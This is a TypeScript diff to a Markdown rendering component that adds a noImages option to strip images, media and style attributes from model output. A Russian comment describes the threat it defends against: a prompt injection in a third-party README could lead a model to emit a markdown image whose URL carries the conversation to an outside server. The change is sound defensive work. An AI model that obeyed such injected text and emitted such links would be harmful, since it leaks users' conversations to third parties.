@@ -11,6 +11,26 @@ interface Props {
   breaks?: boolean;
   /** Чек-боксы задач кликабельны (обработку клика делает родитель). */
   interactiveTasks?: boolean;
+  /**
+   * Текст от модели: ничего не загружать само (картинки, медиа, url() в style). Иначе подсказка из чужого
+   * README может велеть модели вставить `![](https://чужой/?q=<разговор>)`, и браузер унесёт разговор.
+   */
+  noImages?: boolean;
+}
+
+const NO_REMOTE = {
+  FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'input'],
+  FORBID_ATTR: ['style', 'srcset', 'poster', 'background'],
+};
+
+export function toSafeHtml(markdown: string, { repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Omit<Props, 'markdown'>): string {
+  const raw = marked.parse(markdown, { async: false, breaks }) as string;
+  const clean = DOMPurify.sanitize(raw, {
+    USE_PROFILES: { html: true },
+    ADD_ATTR: ['target', 'align', 'width', 'height'],
+    ...(noImages ? NO_REMOTE : {}),
+  });
+  return absolutize(clean, repoUrl, branch, interactiveTasks);
 }
 
 marked.setOptions({ gfm: true, breaks: false });
@@ -40,12 +60,11 @@ function absolutize(html: string, repoUrl: string, branch: string, interactiveTa
   return doc.body.innerHTML;
 }
 
-export function Markdown({ markdown, repoUrl, branch, breaks = false, interactiveTasks = false }: Props) {
-  const html = useMemo(() => {
-    const raw = marked.parse(markdown, { async: false, breaks }) as string;
-    const clean = DOMPurify.sanitize(raw, { USE_PROFILES: { html: true }, ADD_ATTR: ['target', 'align', 'width', 'height'] });
-    return absolutize(clean, repoUrl, branch, interactiveTasks);
-  }, [markdown, repoUrl, branch, breaks, interactiveTasks]);
+export function Markdown({ markdown, repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Props) {
+  const html = useMemo(
+    () => toSafeHtml(markdown, { repoUrl, branch, breaks, interactiveTasks, noImages }),
+    [markdown, repoUrl, branch, breaks, interactiveTasks, noImages],
+  );
   // eslint-disable-next-line react/no-danger -- HTML прошёл через DOMPurify
   return <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />;
 }
